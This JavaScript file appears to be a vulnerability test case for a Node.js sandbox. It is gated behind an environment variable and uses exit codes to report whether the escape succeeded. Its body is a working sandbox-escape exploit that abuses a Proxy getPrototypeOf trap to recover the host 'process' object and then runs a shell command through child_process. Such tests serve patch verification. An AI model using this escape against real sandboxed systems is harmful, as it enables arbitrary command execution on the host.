if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

process.on("uncaughtException", (error) => {
	console.error(error);
	if (
		error.message ===
		"Cannot read properties of undefined (reading 'mainModule')"
	) {
		process.exit(82);
	}

	process.exit(1);
});

var processs;
try {
	Object.defineProperty(Buffer.from(""), "", {
		value: new Proxy(
			{},
			{
				getPrototypeOf(target) {
					if (this.t) throw Buffer.from;
					this.t = true;
					return Object.getPrototypeOf(target);
				},
			},
		),
	});
} catch (e) {
	processs = e.constructor("return process")();
}
processs.mainModule
	.require("child" + "_process")
	.execSync("whoami")
	.toString();
